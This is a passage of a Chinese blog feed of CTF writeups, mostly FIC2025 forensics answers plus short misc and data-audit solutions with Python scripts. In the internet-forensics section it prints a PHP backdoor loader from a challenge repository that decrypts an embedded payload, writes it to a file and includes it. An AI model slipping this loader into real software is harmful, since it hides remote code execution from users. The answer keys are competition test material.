class="headerlink" title="3"></a>3</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，域名dgy02.com曾保存过一个密码，该密码是多少？</strong></p><p>用之前得到的google密钥环进入google浏览器，查看密钥管理即可得到保存的密码</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745856082440-fffa2774-438b-4a02-90d9-0a021002f039.png" alt="img"></p><p>tcgg123456</p><h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，其电脑安装的微信版本是多少？</strong></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745856561213-32ad8303-fd03-4a52-8645-1c4a840105d8.png" alt="img"></p><p>4.0.0.21</p><h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，该系统有哪些远程控制软件</strong></p><p><strong>A. todesk</strong></p><p><strong>B. 向日葵</strong></p><p><strong>C. raylink</strong></p><p><strong>D. 爱思远控</strong></p><p>可以看到是todesk和向日葵</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745856678065-5a7ff31b-72c4-4357-894b-86ec8509491c.png" alt="img"></p><p>AB</p><h3 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，电脑2025年4月10日11点4分29秒曾被向日葵远程控制，其记录的日志文件名为</strong></p><p>先搜索到sunlogin的日志，然后根据时间段锁定日志文件</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745856866404-8645c7fd-747f-46cc-9165-c19b90515241.png" alt="img"></p><p>sunlogin_service.log.2</p><h3 id="7-1"><a href="#7-1" class="headerlink" title="7"></a>7</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，电脑2025年4月10日11点4分29秒曾被向日葵远程控制，日志内记录对方公网IP地址和端口为</strong></p><p>查看日志可以看到ip和端口</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745857122314-6f11ea67-a2e4-44b9-996b-7ec556ab21b1.png" alt="img"></p><p>116.192.161.222:2577</p><h3 id="8-1"><a href="#8-1" class="headerlink" title="8"></a>8</h3><p><strong>请分析检材三，请分析”电脑”检材，并回答，某文件的MD5值为“2bdfcdbd6c63efc094ac154a28968b7d”，该文件名为</strong></p><p>在<code>/home/adm1n/图片</code>下找到一个文件</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745857405265-9242a86c-4514-4815-bc29-155fcbca39d3.png" alt="img"></p><p>important.docx</p><h3 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h3><p><strong>请分析检材三，请分析”电脑”检材，据调查，上述文件存放了钱包助记词，第一个单词是什么？</strong></p><p>将docx后缀改为zip后解压，发现一个important.xml，看起来实际上是个jpg</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745857645412-be31b6dc-5672-4f92-ade1-5634a3d1e320.png" alt="img"></p><p>后缀名改为jpg即可看到助记词</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745857681915-8eab8cea-3f93-4bfe-bb65-037cf56b2802.png" alt="img"></p><p>solution</p><h3 id="10-1"><a href="#10-1" class="headerlink" title="10"></a>10</h3><p><strong>请分析检材三（“我的测试机”），最近曾访问过的音频文件，该音频文件的文件名是什么</strong></p><p>在<code>/home/adm1n/文档</code>下找到我的测试机</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745857834641-325fc450-8ad7-4975-aea3-638a8e54b70f.png" alt="img"></p><p>在这个vmdk中找到音频文件</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745858118986-f8dda44a-e4c3-4100-8482-1831b4b0f600.png" alt="img"></p><p>自传小说.MP3</p><h3 id="11-1"><a href="#11-1" class="headerlink" title="11"></a>11</h3><p><strong>请分析检材三（“我的测试机”），最近曾使用过USB设备，该设备的名称为</strong></p><p><strong>A. ThinkPLus</strong></p><p><strong>B. Toshiba</strong></p><p><strong>C. Samsumg</strong></p><p><strong>D. Database</strong></p><p>查看usb使用痕迹,可以看出是thinkplus</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745858210234-58d82230-c136-4f61-8277-db4a5cc8f6b3.png" alt="img"></p><p>A</p><h3 id="12-1"><a href="#12-1" class="headerlink" title="12"></a>12</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人现任妻子毕业的大学是？</strong><br>下面几题都是硬听音频就行(</p><p>北京大学</p><h3 id="13-1"><a href="#13-1" class="headerlink" title="13"></a>13</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人是通过一个朋友认识的陈老板，该朋友姓氏拼音是？</strong></p><p>wang</p><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人所说的香格里拉大酒店实则是？</strong></p><p>棋牌室</p><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><p><strong>请分析检材三（“我的测试机”）中的音频内容，并回答，嫌疑人银行密码是多少？</strong></p><blockquote><p>这题就非常的抽象了，可以发现音频中的内容是一段一段的，取每一段的第一个字，拼起来就是银行卡密码。。。</p></blockquote><p>取每一段的第一个字，得<code>我的银行密码是07145924</code></p><p>07145924</p><h2 id="互联网取证"><a href="#互联网取证" class="headerlink" title="互联网取证"></a>互联网取证</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p><strong>请分析检材二，找到李某上游人员陈某博客宣传所用域名为</strong></p><p>之前的聊天记录里有提到过</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745859693111-0bca12da-523d-4c6e-b2a8-b9809aa26e73.png" alt="img"></p><p>chen.foren6</p><h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><p><strong>请分析陈某宣传所用域名，该域名的顶级域名在以下那个区块链注册</strong></p><p><strong>A. ETH（<a href="https://ens.domains/%EF%BC%89">https://ens.domains/）</a></strong></p><p><strong>B. HNS（<a href="https://handshake.org/%EF%BC%89">https://handshake.org/）</a></strong></p><p><strong>C. BTC（<a href="https://bitcoin.org/%EF%BC%89">https://bitcoin.org/）</a></strong></p><p><strong>D. Namecoin（<a href="https://www.namecoin.org/%EF%BC%89">https://www.namecoin.org/）</a></strong></p><p>直接去google上查.foren6，就能查到namebase上有相关信息</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745859880267-ba9f58a8-538a-4632-9eb0-3b5f48c7ca12.png" alt="img"></p><p>B</p><h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><p><strong>请分析陈某宣传所用域名的顶级域名的域名解析服务器（DNS）共有几个</strong></p><p>由上题</p><p>2</p><h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><p><strong>请分析陈某宣传所用域名的顶级域名的NS1服务器ip为</strong></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745860950498-d42a7aa2-4525-40a6-9281-a3ed2043cedd.png" alt="img"></p><p>45.79.133.98</p><h3 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h3><p><strong>请分析陈某宣传所用域名，该域名DNS记录指向邮件服务器域名为</strong></p><p>从这里开始配置了<a href="https://docs.hnsdns.com/dns-resolver/">hnsdns</a></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745861239006-8bccfc97-2384-477f-8402-19c986804d61.png" alt="img"></p><p>mail.163.com</p><h3 id="6-2"><a href="#6-2" class="headerlink" title="6"></a>6</h3><p><strong>请分析陈某宣传所用域名，该域名的txt记录中chen的值为</strong></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745861435690-7c6df6a3-8b6a-4035-a59e-46d2ed69aa1e.png" alt="img"></p><p>fengbaoliejiu</p><h3 id="7-2"><a href="#7-2" class="headerlink" title="7"></a>7</h3><p><strong>请分析陈某宣传所用域名，该域名DNS记录没有以下那个域名</strong></p><p><strong>A. admin.chen.foren6</strong></p><p><strong>B. caidan.chen.foren6</strong></p><p><strong>C. fichen.foren6</strong></p><p><strong>D. hl.chen.foren6</strong></p><p>对三个域名dig一下看状态即可。但是据说赛后环境发生了改变，比赛的时候应该是选D。</p><p>从我现在复现来看，应该是选B。</p><p>反正大致方法如此。</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745861849457-af50a77e-ec66-4188-9fda-00e680720dfd.png" alt="img"></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745861864120-b922adc0-da2f-496d-8b61-33b3b1898df8.png" alt="img"></p><h3 id="8-2"><a href="#8-2" class="headerlink" title="8"></a>8</h3><p><strong>请分析陈某宣传所用域名，该博客域名最终DNS解析指向的github仓库名为</strong></p><p>这里其实可以直接在github上搜，反正我比赛时是这么做的()</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745862108188-13ddd158-319f-438a-ac58-eac90606680c.png" alt="img"></p><p>chewhaoN.github.io</p><h3 id="9-2"><a href="#9-2" class="headerlink" title="9"></a>9</h3><p><strong>请分析陈某github账号，陈某对jkroepke&#x2F;2Moons项目增改了几个文件</strong><br><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745863192825-795e84b1-12e8-4fa2-8f34-d299c7f26976.png" alt="img"></p><p>2</p><h3 id="10-2"><a href="#10-2" class="headerlink" title="10"></a>10</h3><p><strong>请分析陈某github账号，陈某在修改2Moons过程中提到了什么锅底</strong></p><p>查看修改过的地方</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745863323520-6407d9f3-4d73-4f96-abbc-7b3db52b0e3c.png" alt="img"></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745863364403-caf2382b-f5ab-4757-bdc3-603d2d611e03.png" alt="img"></p><p>蜂蜜锅底</p><h3 id="11-2"><a href="#11-2" class="headerlink" title="11"></a>11</h3><p><strong>请分析陈某github账号，陈某在游戏2Moons中放置的后门连接码的密码为</strong></p><p>根据前面找到的后门，将css文件下载下来计算一下md5值，encrypted.bin base64编码一下，然后解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = hex2bin(<span class="string">&quot;16ca13d6d1694226be748bb9be927a38&quot;</span>);</span><br><span class="line">$c = <span class="string">&quot;9T8NBGdXI1Xe46fDOsPmrmuhAD9Rk/XQMRukLHJDXMm9wexBjKY/8QQv1OvxCiA87B0ZQ9kFgQiJ0fCquio0EcK5sWr1yUMYrapSWgUXMbD2/P4Qs9lO1cc53rRgZ8lg5r7d21YJkFFkyKJDMAmEjw==&quot;</span>;</span><br><span class="line">$d = base64_decode($c);</span><br><span class="line">$e = <span class="string">&#x27;aes-256-cbc&#x27;</span>;</span><br><span class="line">$f = openssl_cipher_iv_length($e);</span><br><span class="line">$g = substr($d, <span class="number">0</span>, $f);</span><br><span class="line">$h = substr($d, $f);</span><br><span class="line">$i = openssl_decrypt($h, $e, $b, OPENSSL_RAW_DATA, $g);</span><br><span class="line">$k = <span class="string">&#x27;./func_&#x27;</span> . uniqid() . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">file_put_contents($k, $i);</span><br><span class="line">include $k;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745918877052-28272a54-7cf3-4c3b-878f-38ea265d2c3e.png" alt="img"></p><p>ficnb</p><h3 id="12-2"><a href="#12-2" class="headerlink" title="12"></a>12</h3><p><strong>请访问陈某当前博客，陈某课程的扫码报名地址的域名为</strong></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745864111424-72f75efb-2ee4-4fd8-956c-e12ad9712ed3.png" alt="img"></p><p>fic.forensix.cn</p><h3 id="13-2"><a href="#13-2" class="headerlink" title="13"></a>13</h3><p><strong>请分析陈某当前博客，通过互联网找到陈某的旧博客网站标题为</strong></p><p>点老博客得到老博客地址<a href="http://forensix2025.work.gd/">http://forensix2025.work.gd/</a></p><p>在web.archive.org上可以查到过去的网页快照</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745864451149-00b25e4b-172e-4266-8d90-bb82a19adbf0.png" alt="img"></p><p>柳如烟大战霸天虎</p><h3 id="14-1"><a href="#14-1" class="headerlink" title="14"></a>14</h3><p><strong>请分析陈某旧博客，陈某的姓名为</strong></p><p>在前面的题中就可以知道</p><p>陈浩北</p><h3 id="15-1"><a href="#15-1" class="headerlink" title="15"></a>15</h3><p><strong>请分析陈某旧博客，陈某的邮箱地址为</strong></p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745864552401-70ed7075-8cf7-4e41-8224-15f140ead1ed.png" alt="img"></p><p><a href="mailto:&#109;&#97;&#x69;&#x6c;&#109;&#101;&#64;&#99;&#x68;&#x65;&#x6e;&#x2e;&#x66;&#x6f;&#x72;&#101;&#x6e;&#54;">&#109;&#97;&#x69;&#x6c;&#109;&#101;&#64;&#99;&#x68;&#x65;&#x6e;&#x2e;&#x66;&#x6f;&#x72;&#101;&#x6e;&#54;</a></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p> <strong>请分析陈某旧博客，陈某的11位手机号为</strong></p><p>从前面的题中可以知道</p><p>13170010703</p><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p><strong>请分析陈某旧博客，陈某最爱的dota英雄为</strong></p><p>查一下文章的标题就知道了</p><p><img src="/images/FIC2025%E5%88%9D%E8%B5%9B-writeup-%E5%A4%8D%E7%8E%B0/1745864862174-486178d5-8a18-405a-b46c-5b71c94397f1.png" alt="img"></p><p>邪影芳灵</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> FIC </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2025 Writeup</title>
      <link href="/posts/29fccdc3/"/>
      <url>/posts/29fccdc3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>校队刚刚招新结束，这次跟校队打看看新校队实力。</p><p>本菜狗做了点misc，也算是有贡献了，虽说这次大多misc都挺简单的()</p></blockquote><p><a href="https://www.blog.st4rr.top/writeups/ACTF2025Writeup.pdf">Writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> ACTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字中国2025 数字产业安全积分争夺赛决赛 Writeup</title>
      <link href="/posts/c07c3c6c/"/>
      <url>/posts/c07c3c6c/</url>
      
        <content type="html"><![CDATA[<p>不会ai，被爆杀了。</p><p>幸好在这个线下断网的比赛中，脚本编写能力尚且在线，还是做了两题的，也算有所贡献了()</p><p>当然开心的还是成功面基到了很多星盟的师傅们:)</p><h3 id="数据识别与审计题目1"><a href="#数据识别与审计题目1" class="headerlink" title="数据识别与审计题目1"></a>数据识别与审计题目1</h3><p>从流量包中导出所有的phpsessid和查询的value</p><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B-Writeup/1745409137642-c7cd4479-19e6-441a-af8b-ae6726795da2.png" alt="img"></p><p>用脚本处理数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">ff=<span class="built_in">open</span>(<span class="string">&#x27;2.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">searching=f.readline()</span><br><span class="line">phpid=ff.readline()</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3000</span>):</span><br><span class="line">    searching=f.readline().strip()</span><br><span class="line">    phpid=ff.readline().strip()[<span class="number">10</span>:]</span><br><span class="line">    <span class="built_in">print</span>(searching,phpid)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;session_<span class="subst">&#123;phpid&#125;</span>&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fff:</span><br><span class="line">            js=fff.readline().strip()</span><br><span class="line">            pattern = <span class="string">r&#x27;i:\s*(.*?)\s*;&#x27;</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern,js)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                who=<span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(who)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;wtf&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> js[-<span class="number">3</span>]!=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> who!=searching:</span><br><span class="line">                s+=<span class="string">&#x27;_&#x27;</span>+who</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Not found&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B-Writeup/1745409191978-c60616ac-0b31-4fa0-a23c-433204911813.png" alt="img"></p><h3 id="数据识别与审计题目3"><a href="#数据识别与审计题目3" class="headerlink" title="数据识别与审计题目3"></a>数据识别与审计题目3</h3><p>先从网站上爬取所有url，然后用脚本判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://192.168.56.133&#x27;</span></span><br><span class="line">urls=[]</span><br><span class="line">disallows=[<span class="string">&#x27;/logs&#x27;</span>,<span class="string">&#x27;/user/profile&#x27;</span>,<span class="string">&#x27;/api&#x27;</span>,<span class="string">&#x27;/admin&#x27;</span>,<span class="string">&#x27;/private/folder&#x27;</span>,<span class="string">&#x27;/debug&#x27;</span>,<span class="string">&#x27;/details&#x27;</span>,<span class="string">&#x27;.bak&#x27;</span>,<span class="string">&#x27;?token=&#x27;</span>]</span><br><span class="line">allows=[<span class="string">&#x27;/logs/public&#x27;</span>,<span class="string">&#x27;/api/v2/safe&#x27;</span>,<span class="string">&#x27;.zip&#x27;</span>,<span class="string">&#x27;/download&#x27;</span>,<span class="string">&#x27;/about&#x27;</span>,<span class="string">&#x27;/services&#x27;</span>,<span class="string">&#x27;/title&#x27;</span>,<span class="string">&#x27;/products&#x27;</span>,<span class="string">&#x27;/register&#x27;</span>,<span class="string">&#x27;/temp&#x27;</span>,<span class="string">&#x27;/system&#x27;</span>,<span class="string">&#x27;search?q=&#x27;</span>,<span class="string">&#x27;/restricted&#x27;</span>,<span class="string">&#x27;/cart&#x27;</span>]</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">31</span>):</span><br><span class="line">    urll=url+<span class="string">f&#x27;?page=<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    r=requests.get(url=urll).text</span><br><span class="line">    pattern=<span class="string">r&#x27;&lt;a href=&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">    <span class="keyword">match</span>=re.findall(pattern,r)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        urls+=<span class="keyword">match</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> disallows:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> i:</span><br><span class="line">            cnt+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> allows:</span><br><span class="line">                <span class="keyword">if</span> x <span class="keyword">in</span> i:</span><br><span class="line">                    cnt-=<span class="number">1</span></span><br><span class="line">                    <span class="built_in">print</span>(-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(urls))</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2025-%E6%95%B0%E5%AD%97%E4%BA%A7%E4%B8%9A%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B-Writeup/1745409277464-55815b4b-30fd-4867-aea1-1429764bf920.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 数字中国 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>能源安全大赛2025 复现</title>
      <link href="/posts/3012c0e4/"/>
      <url>/posts/3012c0e4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次是跟联队最顶尖的佬们组的队，对我来说完全高端局。师傅们很厉害，给队伍干到了第四名Orz，但是我又爆零了。。。</p><p>赛后看了其他队伍的wp，misc的黑白相间这题我没做出来真的纯纯千古罪人了OrzOrzOrz</p><p>多说无益，开始复现（能看懂的题都复现一下好了）</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="黑白相间"><a href="#黑白相间" class="headerlink" title="黑白相间"></a>黑白相间</h3><p>发现在图片的末尾还有一张倒着的图片，提取出来</p><p><img src="/images/%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2025-%E5%A4%8D%E7%8E%B0/image-20250418193757284.png" alt="image-20250418193757284"></p><p>分别读取1.png和2.png，读到黑色像素记为1，白色像素记为0，将两张图片逐个像素异或得到一个二进制字符串，from bin以后发现是个zip文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image_to_binary</span>(<span class="params">image_path</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    width, height = img.size</span><br><span class="line">    binary_data = []</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            pixel = img.getpixel((x, y))</span><br><span class="line">            binary_data.append(<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pixel == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(binary_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1_path, image2_path</span>):</span><br><span class="line">    binary1 = image_to_binary(image1_path)</span><br><span class="line">    binary2 = image_to_binary(image2_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary1) != <span class="built_in">len</span>(binary2):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;两张图片的尺寸不一致，无法逐像素异或&quot;</span>)</span><br><span class="line">    xor_result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> b1 != b2 <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> <span class="built_in">zip</span>(binary1, binary2)])</span><br><span class="line">    <span class="keyword">return</span> xor_result</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    image1_path = <span class="string">&quot;1.png&quot;</span></span><br><span class="line">    image2_path = <span class="string">&quot;2.png&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xor_result = xor_images(image1_path, image2_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;异或结果的二进制字符串：&quot;</span>, xor_result)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发生错误：&quot;</span>, e)</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2025-%E5%A4%8D%E7%8E%B0/image-20250418194818614.png" alt="image-20250418194818614"></p><blockquote><p>但是卡在这了，解压出来的flag看了半天不知道是什么东西，结果是个去掉了头的bmp文件。。。</p><p>作为一个misc手，对bmp文件的十六进制格式还如此生疏，在此做出深刻检讨。</p></blockquote><p>flag是一个去掉了头的bmp文件，在开头补上424d即可</p><p><img src="/images/%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2025-%E5%A4%8D%E7%8E%B0/image-20250418195500568-1745408801832.png" alt="image-20250418195500568"></p><p>是一个汉信码，但是可以看出左下角的定位点被旋转过了，转回去</p><p><img 